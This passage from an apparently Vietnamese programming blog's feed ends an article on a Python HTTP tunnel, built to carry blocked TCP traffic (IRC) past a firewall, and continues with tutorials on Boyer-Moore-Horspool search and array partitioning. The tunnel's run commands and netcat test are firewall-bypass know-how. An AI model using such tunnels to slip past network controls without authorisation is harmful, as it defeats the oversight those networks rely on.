        &lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getheader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;content-length&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cgi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parse_qs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rfile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;keep_blank_values&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="o"&gt;...&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;do_DELETE&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_close_socket&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;end_headers&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ở đây, &lt;tt class="docutils literal"&gt;ProxyRequestHandler&lt;/tt&gt; chính là một máy chủ HTTP, nhận và xử lý những yêu cầu cơ bản của HTTP.&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;tt class="docutils literal"&gt;do_POST&lt;/tt&gt; hàm này xử lý những yêu cầu POST. Nó sẽ lấy thông tin về máy đối tượng (tên miền, cổng) và tạo kết nối TCP đến máy đó. Nó trả về trạng thái 200 nếu kết nối này thành công.&lt;/li&gt;
&lt;li&gt;&lt;tt class="docutils literal"&gt;do_GET&lt;/tt&gt; hàm này lấy dữ liệu từ kết nối đã được thiết lập với máy đối tương trong &lt;tt class="docutils literal"&gt;do_POST&lt;/tt&gt;. Sau đó nó trả dữ liệu này trong trả lời HTTP của yêu cầu GET.&lt;/li&gt;
&lt;li&gt;&lt;tt class="docutils literal"&gt;do_PUT&lt;/tt&gt; hàm này lấy nhận yêu cầu PUT, đọc dữ liệu từ tải của yêu cầu đó và gửi qua kết nối nói trên.&lt;/li&gt;
&lt;li&gt;&lt;tt class="docutils literal"&gt;do_DELETE&lt;/tt&gt; hàm này đóng kết nối với máy đối tượng.&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="thu-nghiem-chuong-trinh"&gt;
&lt;h2&gt;Thử nghiệm chương trình&lt;/h2&gt;
&lt;p&gt;Chúng ta sẽ thử chương trình này bằng việc kết nối với một IRC server thông qua chương trình. Trước hết, thiết lập đường hầm cần thiết. Tại một máy ngoại mạng, không bị chặn bởi tường lửa, chạy:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
python tunneld.py -p 80
&lt;/pre&gt;
&lt;p&gt;Tại máy nội mạng chạy:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
python tunnel.py -p 8889 -h mayngoaimang:80 irc.freenode.net:6667
&lt;/pre&gt;
&lt;p&gt;Như vậy ta đã thiết lập một đương hầm ở cổng 8889 qua máy ngoại mạng đến IRC server ở cổng 6667. Yêu cầu đến cổng 6667 thường bị chặn bởi tường lửa. Để thử nghiệm, ta kết nối đến cổng 8889 và gửi yêu cầu theo giao thức IRC:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
nc localhost 8889
NICK abcxyz
USER abcxyz abcxyz irc.freenode.net :abcxyz
&lt;/pre&gt;
&lt;p&gt;(nc - netcat - là một công cụ giúp bạn gửi giữ liệu trên TCP &lt;a class="reference external" href="http://www.irongeek.com/i.php?page=backtrack-3-man/netcat"&gt;http://www.irongeek.com/i.php?page=backtrack-3-man/netcat&lt;/a&gt;.)&lt;/p&gt;
&lt;p&gt;Ta nhận được trả lời thông báo kết nối thành công:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
:calvino.freenode.net NOTICE * :*** Looking up your hostname...
:calvino.freenode.net NOTICE * :*** Checking Ident
:calvino.freenode.net NOTICE * :*** Found your hostname
:calvino.freenode.net NOTICE * :*** No Ident response
NICK abcxyz
USER abcxyz abcxyz irc.freenode.net :abcxyz
:calvino.freenode.net 001 abcxyz :Welcome to the freenode Internet Relay Chat Network abcxyz
:calvino.freenode.net 002 abcxyz :Your host is calvino.freenode.net[ ... /6667], running version ircd-seven-1.1.3
:calvino.freenode.net 003 abcxyz :This server was created Sun Dec 4 2011 at 14:42:47 CET
:calvino.freenode.net 004 abcxyz calvino.freenode.net ircd-seven-1.1.3 DOQRSZaghilopswzCFILMPQbcefgijklmnopqrstvz bkloveqjfI
:calvino.freenode.net 005 abcxyz CHANTYPES=# EXCEPTS INVEX CHANMODES=eIbq,k,flj,CFLMPQcgimnprstz CHANLIMIT=#:120 PREFIX=(ov)&amp;#64;+ MAXLIST=bqeI:100 MODES=4 NETWORK=freenode KNOCK STATUSMSG=&amp;#64;+ CALLERID=g :are supported by this server
:calvino.freenode.net 005 abcxyz CASEMAPPING=rfc1459 CHARSET=ascii NICKLEN=16 CHANNELLEN=50 TOPICLEN=390 ETRACE CPRIVMSG CNOTICE DEAF=D MONITOR=100 FNC TARGMAX=NAMES:1,LIST:1,KICK:1,WHOIS:1,PRIVMSG:4,NOTICE:4,ACCEPT:,MONITOR: :are supported by this server
:calvino.freenode.net 005 abcxyz EXTBAN=$,arx WHOX CLIENTVER=3.0 SAFELIST ELIST=CTU :are supported by this server
:calvino.freenode.net 251 abcxyz :There are 232 users and 70582 invisible on 31 servers
:calvino.freenode.net 252 abcxyz 45 :IRC Operators online
:calvino.freenode.net 253 abcxyz 10 :unknown connection(s)
:calvino.freenode.net 254 abcxyz 34513 :channels formed
:calvino.freenode.net 255 abcxyz :I have 6757 clients and 1 servers
:calvino.freenode.net 265 abcxyz 6757 10768 :Current local users 6757, max 10768
:calvino.freenode.net 266 abcxyz 70814 83501 :Current global users 70814, max 83501
:calvino.freenode.net 250 abcxyz :Highest connection count: 10769 (10768 clients) (2194912 connections received)
...
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="ket"&gt;
&lt;h2&gt;Kết&lt;/h2&gt;
&lt;p&gt;Như vậy chúng ta đã đi qua một chương trình xử lý dữ liệu mạng với Python. Chương trình chủ yếu làm việc với dữ liệu thông qua socket API. Một điều quan trọng khác mà bài viết này đề cập đến là sự tách biệt giữa giao thức ứng dụng và dữ liệu gửi trên giao thức đó. Chúng ta có thể vận chuyển dữ liệu mà thông thường đuợc gửi bằng giao thức này qua một giao thức khác.&lt;/p&gt;
&lt;p&gt;Chú ý: Chương trình chỉ có mục đích thí nghiệm và không phù hợp với chạy thực dụng.&lt;/p&gt;
&lt;/div&gt;
</content><category term="tunnel"></category><category term="http"></category></entry><entry><title>Thuật toán đẹp: Tìm chuỗi Boyer-Moore-Horspool</title><link href="/2014/01/thuat-toan-dep-tim-chuoi-boyer-moore-horspool.html" rel="alternate"></link><published>2014-01-09T07:35:00+07:00</published><updated>2014-01-09T07:35:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2014-01-09:/2014/01/thuat-toan-dep-tim-chuoi-boyer-moore-horspool.html</id><summary type="html">&lt;div class="section" id="muc-dich"&gt;
&lt;h2&gt;Mục đích&lt;/h2&gt;
&lt;p&gt;Tìm chính xác (exact match) chuỗi con (substring) trong một chuỗi dài hơn.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="y-tuong-chinh"&gt;
&lt;h2&gt;Ý tưởng chính&lt;/h2&gt;
&lt;p&gt;Gọi chuỗi cần tìm là &lt;strong&gt;P&lt;/strong&gt; (pattern), và chuỗi dài là &lt;strong&gt;T&lt;/strong&gt; (text).&lt;/p&gt;
&lt;p&gt;So sánh ngược P trong T, nghĩa là ta sẽ so sánh ký tự cuối của P trước, sau …&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="muc-dich"&gt;
&lt;h2&gt;Mục đích&lt;/h2&gt;
&lt;p&gt;Tìm chính xác (exact match) chuỗi con (substring) trong một chuỗi dài hơn.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="y-tuong-chinh"&gt;
&lt;h2&gt;Ý tưởng chính&lt;/h2&gt;
&lt;p&gt;Gọi chuỗi cần tìm là &lt;strong&gt;P&lt;/strong&gt; (pattern), và chuỗi dài là &lt;strong&gt;T&lt;/strong&gt; (text).&lt;/p&gt;
&lt;p&gt;So sánh ngược P trong T, nghĩa là ta sẽ so sánh ký tự cuối của P trước, sau đó so sánh ký tự kế cuối, và lần lượt như vậy đến ký tự đầu tiên trong P. Gọi vị trí trong T để bắt đầu so sánh hai chuỗi là &lt;strong&gt;i&lt;/strong&gt;. Việc so sánh sẽ so sánh lần lượt &lt;strong&gt;T[i]&lt;/strong&gt; với ký tự cuối của P, rồi &lt;strong&gt;T[i-1]&lt;/strong&gt; với ký tự kế cuối của P, v.v...&lt;/p&gt;
&lt;p&gt;Nếu việc so sánh ngược vượt qua được ký tự đầu tiên trong P, ta đã tìm được P trong T.&lt;/p&gt;
&lt;p&gt;Nếu việc so sánh ngược bị thất bại, ta sẽ &lt;strong&gt;căn P cho khớp với T[i]&lt;/strong&gt; và thử lại việc so sánh ngược. Điều này tương đương với việc dịch chuyển &lt;strong&gt;i&lt;/strong&gt; đến vị trí xa hơn trong T. Đây là ý tưởng chủ chốt của thuật toán BMH.&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Nếu &lt;strong&gt;T[i]&lt;/strong&gt; không có trong P, thì ta có thể dịch chuyển &lt;strong&gt;i&lt;/strong&gt; đến vị trí &lt;strong&gt;i + len(P)&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Nếu vị trí cuối cùng của &lt;strong&gt;T[i]&lt;/strong&gt; trong P là &lt;strong&gt;x&lt;/strong&gt; thì ta dịch chuyển &lt;strong&gt;i&lt;/strong&gt; đến vị trí &lt;strong&gt;i + len(P) - x - 1&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Trạng thái bắt đầu

             i
             |
             v
+-+-+-+-+-+-+-+-+-+-+-+-+
| | | | |d|b|a| | | | | |
+-+-+-+-+-+-+-+-+-+-+-+-+

    +-+-+-+-+-+
    |a|a|c|b|a|
    +-+-+-+-+-+

------------------------------------------

So sánh tiếp tục

             i
             |
             v
+-+-+-+-+-+-+-+-+-+-+-+-+
| | | | |d|b|a| | | | | |
+-+-+-+-+-+-+-+-+-+-+-+-+
             =
    +-+-+-+-+-+
    |a|a|c|b|a|
    +-+-+-+-+-+

------------------------------------------

So sánh tiếp tục

             i
             |
             v
+-+-+-+-+-+-+-+-+-+-+-+-+
| | | | |d|b|a| | | | | |
+-+-+-+-+-+-+-+-+-+-+-+-+
         = =
    +-+-+-+-+-+
    |a|a|c|b|a|
    +-+-+-+-+-+

------------------------------------------

So sánh sai

             i
             |
             v
+-+-+-+-+-+-+-+-+-+-+-+-+
| | | | |d|b|a| | | | | |
+-+-+-+-+-+-+-+-+-+-+-+-+
         ! = =
    +-+-+-+-+-+
    |a|a|c|b|a|
    +-+-+-+-+-+

------------------------------------------

Căn P theo T[i]...

             i
             |
             v
+-+-+-+-+-+-+-+-+-+-+-+-+
| | | | |d|b|a| | | | | |
+-+-+-+-+-+-+-+-+-+-+-+-+
             |
          +-+-+-+-+-+
          |a|a|c|b|a|
        +-+-+-+-+-+

------------------------------------------

... cũng có nghĩa là dịch chuyển i

                   i
                   |
                   v
+-+-+-+-+-+-+-+-+-+-+-+-+
| | | | |d|b|a| | | | | |
+-+-+-+-+-+-+-+-+-+-+-+-+

        +-+-+-+-+-+
        |a|a|c|b|a|
        +-+-+-+-+-+
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Để cài đặt hai bước trên, người ta thường dùng một mảng chứa vị trí cuối cùng của các ký tự trong P trừ ký tự cuối cùng (P[ : -1]).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="vi-du"&gt;
&lt;h2&gt;Ví dụ&lt;/h2&gt;
&lt;p&gt;Giả sử chúng ta muốn tìm chuỗi &lt;strong&gt;needle&lt;/strong&gt; trong chuỗi &lt;strong&gt;find the needle in the haystack&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Trước khi bắt đầu, ta sẽ lập bảng vị trí cuối của các ký tự trong P[ : -1].&lt;/p&gt;
&lt;table border="1" class="docutils"&gt;
&lt;colgroup&gt;
&lt;col width="11%" /&gt;
&lt;col width="14%" /&gt;
&lt;col width="75%" /&gt;
&lt;/colgroup&gt;
&lt;thead valign="bottom"&gt;
&lt;tr&gt;&lt;th class="head"&gt;Ký tự&lt;/th&gt;
&lt;th class="head"&gt;Vị trí&lt;/th&gt;
&lt;th class="head"&gt;Diễn giải&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td&gt;n&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;e&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;Ta chọn vị trí của ký tự thứ hai.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;d&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;l&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Sau đó ta sẽ xem xét sự thay đổi ở các bước của thuật toán. Vì độ dài của P là 6, nên i sẽ bắt đầu từ vị trí 5. Trong bảng dưới, chữ đậm là ký tự trùng nhau của T và P, chữ gạch dưới là các ký tự đang xét.&lt;/p&gt;
&lt;table border="1" class="docutils"&gt;
&lt;colgroup&gt;
&lt;col width="2%" /&gt;
&lt;col width="33%" /&gt;
&lt;col width="11%" /&gt;
&lt;col width="55%" /&gt;
&lt;/colgroup&gt;
&lt;thead valign="bottom"&gt;
&lt;tr&gt;&lt;th class="head"&gt;i&lt;/th&gt;
&lt;th class="head"&gt;T&lt;/th&gt;
&lt;th class="head"&gt;T[i]&lt;/th&gt;
&lt;th class="head"&gt;Diễn giải&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;&lt;u&gt;find t&lt;/u&gt;he needle in the haystack&lt;/td&gt;
&lt;td&gt;t&lt;/td&gt;
&lt;td&gt;t không có trong bảng. Dịch i lên 11 (5 + 6).&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;find t&lt;u&gt;he ne&lt;strong&gt;e&lt;/strong&gt;&lt;/u&gt;dle in the haystack&lt;/td&gt;
&lt;td&gt;e&lt;/td&gt;
&lt;td&gt;e có trong bảng. Dịch i lên 14 (11 + 6 - 2 - 1).&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;14&lt;/td&gt;
&lt;td&gt;find the &lt;u&gt;&lt;strong&gt;needle&lt;/strong&gt;&lt;/u&gt; in the haystack&lt;/td&gt;
&lt;td&gt;e&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Tìm thấy&lt;/strong&gt;. e có trong bảng. Dịch i lên 17 (14 + 6 - 2 - 1).&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;17&lt;/td&gt;
&lt;td&gt;find the nee&lt;u&gt;dle&amp;nbsp;in&lt;/u&gt; the haystack&lt;/td&gt;
&lt;td&gt;n&lt;/td&gt;
&lt;td&gt;n có trong bảng. Dịch i lên 22 (17 + 6 - 0 - 1).&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;22&lt;/td&gt;
&lt;td&gt;find the needle i&lt;u&gt;n&amp;nbsp;the&amp;nbsp;&lt;/u&gt;haystack&lt;/td&gt;
&lt;td&gt;khoảng trắng&lt;/td&gt;
&lt;td&gt;khoảng trắng không có trong bảng. Dịch i lên 28 (22 + 6).&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;28&lt;/td&gt;
&lt;td&gt;find the needle in the &lt;u&gt;haysta&lt;/u&gt;ck&lt;/td&gt;
&lt;td&gt;a&lt;/td&gt;
&lt;td&gt;a không có trong bảng. Dịch i lên 34 (28 + 6).
Dừng việc tìm kiếm vì đã xét hết chuỗi.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;div class="section" id="do-phuc-tap"&gt;
&lt;h2&gt;Độ phức tạp&lt;/h2&gt;
&lt;dl class="docutils"&gt;
&lt;dt&gt;Thời gian chạy&lt;/dt&gt;
&lt;dd&gt;Tệ nhất là O(n*m), với n là độ dài của T và m là độ dài của P. Trung bình là O(n). Và tốt nhất là dưới tuyến tính (sublinear) vì thuật toán có thể nhảy qua nhiều ký tự. Trong ví dụ trên, ta chỉ cần 12 phép so sánh  để tìm chuỗi &lt;strong&gt;needle&lt;/strong&gt; (6 ký tự) trong chuỗi &lt;strong&gt;find the needle in the haystack&lt;/strong&gt; (31 ký tự).&lt;/dd&gt;
&lt;dt&gt;Bộ nhớ cần thiết&lt;/dt&gt;
&lt;dd&gt;O(n) với n là số ký tự trong bảng chữ cái (ví dụ như 256 giá trị của một byte, hoặc nếu bảng chữ cái là Unicode thì có thể sẽ nhiều hơn 60000 giá trị) vì chúng ta cần tạo bảng vị trí các ký tự trong P.&lt;/dd&gt;
&lt;/dl&gt;
&lt;p&gt;Thuật toán BMH là thuật toán tìm chuỗi chính xác tổng quát nhất, nhanh nhất, và đơn giản nhất.&lt;/p&gt;
&lt;/div&gt;
</content><category term="search"></category><category term="string"></category><category term="algorithm"></category></entry><entry><title>Thuật toán đẹp: Partition (ngăn)</title><link href="/2013/12/thuat-toan-dep-partition-ngan.html" rel="alternate"></link><published>2013-12-31T17:34:00+07:00</published><updated>2013-12-31T17:34:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2013-12-31:/2013/12/thuat-toan-dep-partition-ngan.html</id><summary type="html">&lt;div class="section" id="muc-dich"&gt;
&lt;h2&gt;Mục đích&lt;/h2&gt;
&lt;p&gt;Chia một mảng ra thành hai cụm: một cụm thỏa điều kiện, và cụm còn lại.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="cai-dat"&gt;
&lt;h2&gt;Cài đặt&lt;/h2&gt;
&lt;div class="section" id="su-dung-mang-phu"&gt;
&lt;h3&gt;Sử dụng mảng phụ&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;partition&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pred&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="n"&gt;head&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;pred&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
  &lt;span class="n"&gt;tail&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;pred&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;head&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;tail …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="muc-dich"&gt;
&lt;h2&gt;Mục đích&lt;/h2&gt;
&lt;p&gt;Chia một mảng ra thành hai cụm: một cụm thỏa điều kiện, và cụm còn lại.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="cai-dat"&gt;
&lt;h2&gt;Cài đặt&lt;/h2&gt;
&lt;div class="section" id="su-dung-mang-phu"&gt;
&lt;h3&gt;Sử dụng mảng phụ&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;partition&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pred&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="n"&gt;head&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;pred&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
  &lt;span class="n"&gt;tail&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;pred&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;head&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;tail&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;head&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="khong-dung-mang-phu"&gt;
&lt;h3&gt;Không dùng mảng phụ&lt;/h3&gt;
&lt;p&gt;Ý tưởng chính là sử dụng một biến phụ chứa vị trí trong mảng A mà nếu phần tử đang xét thỏa điều kiện &lt;strong&gt;sẽ&lt;/strong&gt; được chuyển vào.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;partition&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pred&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;okay_idx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;enumerate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;pred&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;okay_idx&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;okay_idx&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;# swap&lt;/span&gt;
            &lt;span class="n"&gt;okay_idx&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;okay_idx&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="do-phuc-tap"&gt;
&lt;h2&gt;Độ phức tạp&lt;/h2&gt;
&lt;dl class="docutils"&gt;
&lt;dt&gt;Thời gian chạy&lt;/dt&gt;
&lt;dd&gt;O(n)&lt;/dd&gt;
&lt;dt&gt;Bộ nhớ cần thiết&lt;/dt&gt;
&lt;dd&gt;O(n) nếu sử dụng mảng phụ, hoặc O(1) nếu không&lt;/dd&gt;
&lt;/dl&gt;
&lt;/div&gt;
&lt;div class="section" id="ung-dung"&gt;
&lt;h2&gt;Ứng dụng&lt;/h2&gt;
